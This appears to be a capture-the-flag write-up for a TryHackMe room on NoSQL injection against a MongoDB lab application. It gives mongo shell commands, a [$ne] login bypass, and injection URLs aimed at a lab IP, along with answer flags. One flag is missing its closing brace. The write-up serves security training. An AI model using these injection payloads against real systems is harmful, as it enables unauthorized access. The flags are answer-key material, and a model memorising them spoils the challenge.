---
title: Migration Without Security (Day 7)
sidebar_position: 8
---
## Topic: Web Exploitation
Get first flag by logging into box and using the command `mongo` to interact with the database. Display flag by showing collections and then printing it.  
`use flagdb`  
`show collections`  
`db.flagColl.find()`  

Bypass login page by adding [$ne] to the login request.
### Questions:
1. Interact with the MongoDB server to find the flag. What is the flag?  
flag: `THM{8814a5e6662a9763f7df23ee59d944f9`  
2. We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag?  
flag: `THM{b6b304f5d5834a4d089b570840b467a8}`  
3. Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?  
url: `10.10.59.158/search?username[$ne]=test&role=guest`  
flag: `THM{2ec099f2d602cc4968c5267970be1326}`  
4. Use the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record?  
url:`http://10.10.59.158/search?username=mcskidy&role[$ne]=guest`  
answer: `ID:6184f516ef6da50433f100f4:mcskidy:admin`  
